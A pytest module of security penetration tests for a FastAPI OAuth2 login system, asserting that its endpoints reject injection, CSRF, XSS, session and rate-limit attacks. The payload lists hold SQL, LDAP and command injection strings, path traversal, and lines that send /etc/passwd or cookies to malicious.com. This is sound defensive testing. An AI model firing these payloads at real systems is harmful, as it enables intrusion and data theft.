"""
Security penetration tests for OAuth2 browser authentication system.

This module provides comprehensive security penetration testing to identify
vulnerabilities and ensure the OAuth2 browser authentication system is secure
against common attack vectors and advanced security threats.

Test Categories:
- Authentication bypass attempts
- Session hijacking and fixation attacks
- CSRF and XSS vulnerability testing
- SQL injection and NoSQL injection attempts
- Rate limiting and DoS protection testing
- Authorization code interception attempts
- Token manipulation and replay attacks
- Side-channel attack resistance
"""

import base64
import hashlib
import hmac
import json
import secrets
import time
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional
from unittest.mock import AsyncMock, MagicMock, patch
from urllib.parse import parse_qs, urlparse

import pytest
from fastapi.testclient import TestClient

from second_brain_database.main import app
from second_brain_database.routes.oauth2.session_manager import SESSION_COOKIE_NAME, CSRF_COOKIE_NAME

# Test client setup
client = TestClient(app)

# Test constants
TEST_USER_ID = "security_test_user"
TEST_CLIENT_ID = "security_test_client"
TEST_REDIRECT_URI = "https://example.com/callback"
MALICIOUS_REDIRECT_URI = "https://malicious.com/steal"


class TestAuthenticationBypassAttempts:
    """Tests for various authentication bypass attack vectors."""
    
    def test_sql_injection_in_login_form(self):
        """Test SQL injection attempts in login form."""
        sql_injection_payloads = [
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "admin' UNION SELECT * FROM users --",
            "' OR 1=1 --",
            "admin' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --",
            "admin' AND (SELECT COUNT(*) FROM users) > 0 --",
        ]
        
        for payload in sql_injection_payloads:
            response = client.post("/auth/login", data={
                "username": payload,
                "password": "any_password",
                "csrf_token": "valid_csrf_token"
            })
            
            # Should not succeed with SQL injection
            assert response.status_code in [400, 401, 403]
            
            # Should not expose database errors
            response_text = response.text.lower()
            assert "sql" not in response_text
            assert "database" not in response_text
            assert "mysql" not in response_text
            assert "postgresql" not in response_text
            assert "mongodb" not in response_text
    
    def test_nosql_injection_in_login_form(self):
        """Test NoSQL injection attempts in login form."""
        nosql_injection_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.username == 'admin'"},
            {"$or": [{"username": "admin"}, {"username": "root"}]},
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
        ]
        
        for payload in nosql_injection_payloads:
            # Test as string payload
            if isinstance(payload, str):
                test_payload = payload
            else:
                test_payload = json.dumps(payload)
            
            response = client.post("/auth/login", data={
                "username": test_payload,
                "password": "any_password",
                "csrf_token": "valid_csrf_token"
            })
            
            # Should not succeed with NoSQL injection
            assert response.status_code in [400, 401, 403]
            
            # Should not expose database errors
            response_text = response.text.lower()
            assert "mongodb" not in response_text
            assert "collection" not in response_text
            assert "bson" not in response_text
    
    def test_ldap_injection_attempts(self):
        """Test LDAP injection attempts in authentication."""
        ldap_injection_payloads = [
            "admin)(|(password=*))",
            "admin)(&(password=*))",
            "*)(uid=*))(|(uid=*",
            "admin)(cn=*)",
            "admin))(|(cn=*",
            "*)(&(objectClass=*)",
        ]
        
        for payload in ldap_injection_payloads:
            response = client.post("/auth/login", data={
                "username": payload,
                "password": "any_password",
                "csrf_token": "valid_csrf_token"
            })
            
            # Should not succeed with LDAP injection
            assert response.status_code in [400, 401, 403]
            
            # Should not expose LDAP errors
            response_text = response.text.lower()
            assert "ldap" not in response_text
            assert "directory" not in response_text
    
    def test_command_injection_attempts(self):
        """Test command injection attempts in form fields."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`whoami`",
            "; curl http://malicious.com/steal?data=$(cat /etc/passwd)",
            "'; system('ls -la'); --",
        ]
        
        for payload in command_injection_payloads:
            response = client.post("/auth/login", data={
                "username": f"admin{payload}",
                "password": f"password{payload}",
                "csrf_token": "valid_csrf_token"
            })
            
            # Should not execute commands
            assert response.status_code in [400, 401, 403]
            
            # Should not expose system information
            response_text = response.text.lower()
            assert "root:" not in response_text
            assert "/bin/bash" not in response_text
            assert "uid=" not in response_text
    
    def test_path_traversal_attempts(self):
        """Test path traversal attempts in various parameters."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ]
        
        for payload in path_traversal_payloads:
            # Test in username field
            response = client.post("/auth/login", data={
                "username": payload,
                "password": "password",
                "csrf_token": "valid_csrf_token"
            })
            
            assert response.status_code in [400, 401, 403]
            
            # Test in redirect_uri parameter
            response = client.get(f"/auth/login?redirect_uri={payload}")
            
            # Should not expose file contents
            response_text = response.text.lower()
            assert "root:" not in response_text
            assert "/bin/bash" not in response_text
    
    def test_authentication_timing_attacks(self):
        """Test resistance to timing-based user enumeration attacks."""
        import time
        
        # Test with non-existent users
        nonexistent_times = []
        for i in range(10):
            start_time = time.time()
            response = client.post("/auth/login", data={
                "username": f"nonexistent_user_{i}_{secrets.token_hex(8)}",
                "password": "any_password",
                "csrf_token": "valid_csrf_token"
            })
            end_time = time.time()
            nonexistent_times.append(end_time - start_time)
            assert response.status_code in [400, 401, 403]
        
        # Test with potentially existing users (common usernames)
        common_usernames = ["admin", "root", "user", "test", "guest"]
        existing_times = []
        for username in common_usernames:
            start_time = time.time()
            response = client.post("/auth/login", data={
                "username": username,
                "password": "wrong_password",
                "csrf_token": "valid_csrf_token"
            })
            end_time = time.time()
            existing_times.append(end_time - start_time)
            assert response.status_code in [400, 401, 403]
        
        # Calculate timing statistics
        avg_nonexistent = sum(nonexistent_times) / len(nonexistent_times)
        avg_existing = sum(existing_times) / len(existing_times)
        
        # Timing difference should not be significant enough for user enumeration
        timing_difference = abs(avg_nonexistent - avg_existing)
        max_allowed_difference = max(avg_nonexistent, avg_existing) * 0.3  # 30% variance
        
        assert timing_difference < max_allowed_difference, \
            f"Timing difference too large: {timing_difference:.4f}s (max allowed: {max_allowed_difference:.4f}s)"
    
    def test_brute_force_protection(self):
        """Test brute force attack protection."""
        # Attempt multiple failed logins
        for attempt in range(20):  # Try 20 failed attempts
            response = client.post("/auth/login", data={
                "username": "admin",
                "password": f"wrong_password_{attempt}",
                "csrf_token": "valid_csrf_token"
            })
            
            # Should eventually trigger rate limiting
            if response.status_code == 429:
                break
            
            assert response.status_code in [400, 401, 403]
        
        # Should have triggered rate limiting by now
        final_response = client.post("/auth/login", data={
            "username": "admin",
            "password": "wrong_password_final",
            "csrf_token": "valid_csrf_token"
        })
        
        # Should be rate limited
        assert final_response.status_code in [429, 403]


class TestSessionSecurityAttacks:
    """Tests for session hijacking, fixation, and manipulation attacks."""
    
    def test_session_fixation_attack(self):
        """Test resistance to session fixation attacks."""
        # Step 1: Get initial session ID (if any)
        initial_response = client.get("/auth/login")
        initial_cookies = initial_response.cookies
        initial_session = initial_cookies.get(SESSION_COOKIE_NAME)
        
        # Step 2: Attempt login with fixed session
        with patch('second_brain_database.routes.auth.services.auth.login.login_user') as mock_login:
            mock_login.return_value = {"user_id": TEST_USER_ID, "username": "testuser"}
            
            login_response = client.post("/auth/login", 
                                       cookies=initial_cookies,
                                       data={
                                           "username": "testuser",
                                           "password": "testpass",
                                           "csrf_token": "valid_csrf_token"
                                       })
            
            # Step 3: Verify session ID changed after authentication
            new_session = login_response.cookies.get(SESSION_COOKIE_NAME)
            
            if initial_session and new_session:
                assert new_session != initial_session, "Session ID should change after authentication"
    
    def test_session_token_manipulation(self):
        """Test resistance to session token manipulation attacks."""
        # Create a valid session first
        with patch('second_brain_database.routes.oauth2.session_manager.redis_manager') as mock_redis:
            redis_client = mock_redis.get_redis.return_value
            redis_client.get = AsyncMock(return_value=json.dumps({
                "user_id": TEST_USER_ID,
                "created_at": datetime.utcnow().isoformat(),
                "expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
                "is_active": True
            }))
            
            # Test various session token manipulations
            manipulated_tokens = [
                "valid_session_id",  # Original
                "valid_session_id" + "x",  # Appended character
                "x" + "valid_session_id",  # Prepended character
                "valid_session_id"[:-1],  # Truncated
                "valid_session_id".upper(),  # Case changed
                base64.b64encode(b"valid_session_id").decode(),  # Base64 encoded
                "valid_session_id".replace("_", "-"),  # Character substitution
                "",  # Empty token
                "a" * 1000,  # Very long token
            ]
            
            for token in manipulated_tokens[1:]:  # Skip the original valid token
                response = client.get("/oauth2/authorize", 
                                    cookies={SESSION_COOKIE_NAME: token})
                
                # Should not authenticate with manipulated tokens
                assert response.status_code in [302, 401, 403]
                
                # Should redirect to login for invalid sessions
                if response.status_code == 302:
                    assert "/auth/login" in response.headers.get("location", "")
    
    def test_session_replay_attack(self):
        """Test resistance to session replay attacks."""
        # Simulate session creation and invalidation
        with patch('second_brain_database.routes.oauth2.session_manager.redis_manager') as mock_redis:
            redis_client = mock_redis.get_redis.return_value
            
            # First, session exists
            redis_client.get = AsyncMock(return_value=json.dumps({
                "user_id": TEST_USER_ID,
                "created_at": datetime.utcnow().isoformat(),
                "expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
                "is_active": True
            }))
            
            # Make request with valid session
            response1 = client.get("/oauth2/authorize", 
                                 cookies={SESSION_COOKIE_NAME: "valid_session_id"})
            
            # Now simulate session invalidation (logout)
            redis_client.get = AsyncMock(return_value=None)  # Session no longer exists
            
            # Try to replay the same session token
            response2 = client.get("/oauth2/authorize", 
                                 cookies={SESSION_COOKIE_NAME: "valid_session_id"})
            
            # Should not work with invalidated session
            assert response2.status_code in [302, 401, 403]
    
    def test_concurrent_session_attacks(self):
        """Test resistance to concurrent session manipulation attacks."""
        import threading
        import time
        
        results = []
        
        def session_attack_thread(session_id):
            """Simulate concurrent session usage."""
            try:
                response = client.get("/oauth2/authorize", 
                                    cookies={SESSION_COOKIE_NAME: session_id})
                results.append({
                    "session_id": session_id,
                    "status_code": response.status_code,
                    "thread_id": threading.current_thread().ident
                })
            except Exception as e:
                results.append({
                    "session_id": session_id,
                    "error": str(e),
                    "thread_id": threading.current_thread().ident
                })
        
        # Launch concurrent requests with same session ID
        threads = []
        session_id = "concurrent_test_session"
        
        for _ in range(10):
            thread = threading.Thread(target=session_attack_thread, args=(session_id,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Verify all requests were handled properly
        assert len(results) == 10
        
        # All should fail (no valid session) but not crash
        for result in results:
            assert "error" not in result  # No exceptions should occur
            assert result["status_code"] in [302, 401, 403]
    
    def test_session_cookie_security_attributes(self):
        """Test session cookie security attributes."""
        with patch('second_brain_database.routes.auth.services.auth.login.login_user') as mock_login:
            mock_login.return_value = {"user_id": TEST_USER_ID, "username": "testuser"}
            
            response = client.post("/auth/login", data={
                "username": "testuser",
                "password": "testpass",
                "csrf_token": "valid_csrf_token"
            })
            
            # Check session cookie attributes
            session_cookie = response.cookies.get(SESSION_COOKIE_NAME)
            
            if session_cookie:
                # Verify security attributes are set
                assert session_cookie.get("httponly") is True, "Session cookie should be HttpOnly"
                assert session_cookie.get("secure") is True, "Session cookie should be Secure"
                assert session_cookie.get("samesite") in ["lax", "strict"], "Session cookie should have SameSite"


class TestCSRFAndXSSVulnerabilities:
    """Tests for CSRF and XSS vulnerability resistance."""
    
    def test_csrf_token_bypass_attempts(self):
        """Test various CSRF token bypass techniques."""
        csrf_bypass_payloads = [
            "",  # Empty CSRF token
            "null",  # String null
            "undefined",  # String undefined
            "false",  # String false
            "0",  # String zero
            " ",  # Whitespace
            "\n",  # Newline
            "\t",  # Tab
            "valid_csrf_token",  # Potentially valid format but wrong token
            "a" * 100,  # Very long token
            "../../../etc/passwd",  # Path traversal in CSRF token
            "<script>alert('xss')</script>",  # XSS in CSRF token
            "'; DROP TABLE sessions; --",  # SQL injection in CSRF token
        ]
        
        for payload in csrf_bypass_payloads:
            response = client.post("/auth/login", data={
                "username": "testuser",
                "password": "testpass",
                "csrf_token": payload
            })
            
            # Should reject invalid CSRF tokens
            assert response.status_code in [400, 403], f"CSRF bypass succeeded with payload: {payload}"
            
            # Should not expose sensitive information in error
            response_text = response.text.lower()
            assert "csrf" not in response_text or "invalid" in response_text
    
    def test_xss_in_form_fields(self):
        """Test XSS resistance in form fields."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "';alert('xss');//",
            "\"><script>alert('xss')</script>",
            "<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
        ]
        
        for payload in xss_payloads:
            # Test XSS in username field
            response = client.post("/auth/login", data={
                "username": payload,
                "password": "testpass",
                "csrf_token": "valid_csrf_token"
            })
            
            # Should not execute JavaScript
            response_text = response.text
            assert "<script>" not in response_text
            assert "javascript:" not in response_text.lower()
            assert "onerror=" not in response_text.lower()
            assert "onload=" not in response_text.lower()
            
            # Test XSS in redirect_uri parameter
            response = client.get(f"/auth/login?redirect_uri={payload}")
            
            response_text = response.text
            assert "<script>" not in response_text
            assert "javascript:" not in response_text.lower()
    
    def test_csrf_double_submit_cookie_bypass(self):
        """Test CSRF double submit cookie bypass attempts."""
        # Attempt to set malicious CSRF cookie
        malicious_csrf = "malicious_csrf_token"
        
        response = client.post("/auth/login", 
                             cookies={CSRF_COOKIE_NAME: malicious_csrf},
                             data={
                                 "username": "testuser",
                                 "password": "testpass",
                                 "csrf_token": malicious_csrf  # Matching the cookie
                             })
        
        # Should not accept malicious CSRF token even if cookie matches
        assert response.status_code in [400, 403]
    
    def test_clickjacking_protection(self):
        """Test clickjacking protection headers."""
        response = client.get("/auth/login")
        
        # Should have X-Frame-Options or CSP frame-ancestors
        headers = response.headers
        
        has_frame_options = "x-frame-options" in headers
        has_csp_frame = "content-security-policy" in headers and "frame-ancestors" in headers.get("content-security-policy", "")
        
        assert has_frame_options or has_csp_frame, "Missing clickjacking protection headers"
        
        if has_frame_options:
            frame_options = headers["x-frame-options"].lower()
            assert frame_options in ["deny", "sameorigin"], f"Weak X-Frame-Options: {frame_options}"
    
    def test_content_type_sniffing_protection(self):
        """Test content type sniffing protection."""
        response = client.get("/auth/login")
        
        # Should have X-Content-Type-Options: nosniff
        assert "x-content-type-options" in response.headers
        assert response.headers["x-content-type-options"].lower() == "nosniff"


class TestOAuth2SpecificAttacks:
    """Tests for OAuth2-specific attack vectors."""
    
    def test_authorization_code_interception(self):
        """Test resistance to authorization code interception attacks."""
        # Test with malicious redirect URI
        response = client.get(f"/oauth2/authorize", params={
            "client_id": TEST_CLIENT_ID,
            "redirect_uri": MALICIOUS_REDIRECT_URI,
            "response_type": "code",
            "scope": "read",
            "state": "test_state"
        })
        
        # Should reject unregistered redirect URI
        assert response.status_code in [400, 401, 403]
        
        # Should not redirect to malicious URI
        if response.status_code == 302:
            location = response.headers.get("location", "")
            assert MALICIOUS_REDIRECT_URI not in location
    
    def test_state_parameter_manipulation(self):
        """Test state parameter manipulation attacks."""
        state_manipulation_payloads = [
            "",  # Empty state
            "../../../etc/passwd",  # Path traversal
            "<script>alert('xss')</script>",  # XSS
            "'; DROP TABLE oauth_states; --",  # SQL injection
            "a" * 10000,  # Very long state
            "state1&state=state2",  # Parameter pollution
            "%00%00%00",  # Null bytes
            "state\r\nLocation: http://malicious.com",  # HTTP response splitting
        ]
        
        for payload in state_manipulation_payloads:
            response = client.get(f"/oauth2/authorize", params={
                "client_id": TEST_CLIENT_ID,
                "redirect_uri": TEST_REDIRECT_URI,
                "response_type": "code",
                "scope": "read",
                "state": payload
            })
            
            # Should handle malicious state parameters safely
            if response.status_code == 302:
                location = response.headers.get("location", "")
                # State should be properly encoded/escaped in redirect
                assert "<script>" not in location
                assert "DROP TABLE" not in location
    
    def test_pkce_bypass_attempts(self):
        """Test PKCE (Proof Key for Code Exchange) bypass attempts."""
        # Test authorization request without PKCE for public client
        response = client.get(f"/oauth2/authorize", params={
            "client_id": "public_client_id",
            "redirect_uri": TEST_REDIRECT_URI,
            "response_type": "code",
            "scope": "read",
            "state": "test_state"
            # Missing code_challenge and code_challenge_method
        })
        
        # Should require PKCE for public clients
        # (Implementation depends on client configuration)
        assert response.status_code in [302, 400, 401]
    
    def test_scope_escalation_attacks(self):
        """Test scope escalation attack attempts."""
        # Test with excessive scopes
        excessive_scopes = [
            "read write admin delete",
            "* all everything",
            "read write " + "scope" * 1000,  # Very long scope
            "read\nwrite\nadmin",  # Newlines in scope
            "read;write;admin",  # Semicolons in scope
            "read,write,admin",  # Commas in scope
        ]
        
        for scope in excessive_scopes:
            response = client.get(f"/oauth2/authorize", params={
                "client_id": TEST_CLIENT_ID,
                "redirect_uri": TEST_REDIRECT_URI,
                "response_type": "code",
                "scope": scope,
                "state": "test_state"
            })
            
            # Should validate and limit scopes
            # Exact behavior depends on implementation
            assert response.status_code in [302, 400, 401]
    
    def test_client_impersonation_attacks(self):
        """Test client impersonation attack attempts."""
        # Test with non-existent client ID
        response = client.get(f"/oauth2/authorize", params={
            "client_id": "non_existent_client_12345",
            "redirect_uri": TEST_REDIRECT_URI,
            "response_type": "code",
            "scope": "read",
            "state": "test_state"
        })
        
        # Should reject unknown client
        assert response.status_code in [400, 401]
        
        # Should not expose client information in error
        response_text = response.text.lower()
        assert "client_secret" not in response_text
        assert "client_id" not in response_text or "invalid" in response_text


class TestRateLimitingAndDoSProtection:
    """Tests for rate limiting and DoS protection mechanisms."""
    
    def test_login_rate_limiting(self):
        """Test login endpoint rate limiting."""
        # Make rapid login attempts
        for attempt in range(50):
            response = client.post("/auth/login", data={
                "username": f"user_{attempt}",
                "password": "password",
                "csrf_token": "valid_csrf_token"
            })
            
            # Should eventually trigger rate limiting
            if response.status_code == 429:
                break
            
            assert response.status_code in [400, 401, 403]
        
        # Verify rate limiting is active
        final_response = client.post("/auth/login", data={
            "username": "rate_limited_user",
            "password": "password",
            "csrf_token": "valid_csrf_token"
        })
        
        assert final_response.status_code in [429, 403]
    
    def test_oauth2_endpoint_rate_limiting(self):
        """Test OAuth2 endpoint rate limiting."""
        # Make rapid OAuth2 authorization requests
        for attempt in range(100):
            response = client.get(f"/oauth2/authorize", params={
                "client_id": f"client_{attempt}",
                "redirect_uri": TEST_REDIRECT_URI,
                "response_type": "code",
                "scope": "read",
                "state": f"state_{attempt}"
            })
            
            # Should eventually trigger rate limiting
            if response.status_code == 429:
                break
        
        # Verify rate limiting is active
        final_response = client.get(f"/oauth2/authorize", params={
            "client_id": "rate_limited_client",
            "redirect_uri": TEST_REDIRECT_URI,
            "response_type": "code",
            "scope": "read",
            "state": "rate_limited_state"
        })
        
        assert final_response.status_code in [429, 403]
    
    def test_large_payload_dos_protection(self):
        """Test protection against large payload DoS attacks."""
        # Test with very large form data
        large_payload = "x" * (10 * 1024 * 1024)  # 10MB payload
        
        response = client.post("/auth/login", data={
            "username": large_payload,
            "password": "password",
            "csrf_token": "valid_csrf_token"
        })
        
        # Should reject large payloads
        assert response.status_code in [400, 413, 422]  # Bad request, payload too large, or unprocessable entity
    
    def test_slowloris_attack_protection(self):
        """Test protection against slowloris-style attacks."""
        import time
        
        # Simulate slow request by making request and measuring response time
        start_time = time.time()
        
        response = client.post("/auth/login", data={
            "username": "slowloris_test",
            "password": "password",
            "csrf_token": "valid_csrf_token"
        })
        
        end_time = time.time()
        response_time = end_time - start_time
        
        # Should respond within reasonable time (not hang indefinitely)
        assert response_time < 30.0  # Should respond within 30 seconds
        assert response.status_code in [400, 401, 403]
    
    def test_concurrent_request_dos_protection(self):
        """Test protection against concurrent request DoS attacks."""
        import threading
        import time
        
        results = []
        
        def dos_attack_thread():
            """Simulate DoS attack thread."""
            try:
                response = client.get("/oauth2/authorize", params={
                    "client_id": TEST_CLIENT_ID,
                    "redirect_uri": TEST_REDIRECT_URI,
                    "response_type": "code",
                    "scope": "read",
                    "state": f"dos_state_{threading.current_thread().ident}"
                })
                results.append(response.status_code)
            except Exception as e:
                results.append(f"error: {str(e)}")
        
        # Launch many concurrent requests
        threads = []
        for _ in range(100):
            thread = threading.Thread(target=dos_attack_thread)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads with timeout
        start_time = time.time()
        for thread in threads:
            remaining_time = max(0, 30 - (time.time() - start_time))
            thread.join(timeout=remaining_time)
        
        # Should handle concurrent requests without crashing
        assert len(results) > 0  # At least some requests should complete
        
        # Should have some rate limiting or error responses
        error_responses = [r for r in results if isinstance(r, int) and r >= 400]
        assert len(error_responses) > 0  # Should have some error responses due to rate limiting


# Test execution and reporting
if __name__ == "__main__":
    print("Running OAuth2 Security Penetration Tests...")
    print("=" * 70)
    print("⚠️  WARNING: These are security penetration tests.")
    print("   Only run against systems you own or have permission to test.")
    print("=" * 70)
    
    # This would typically be run with pytest
    # pytest tests/test_oauth2_security_penetration.py -v --tb=short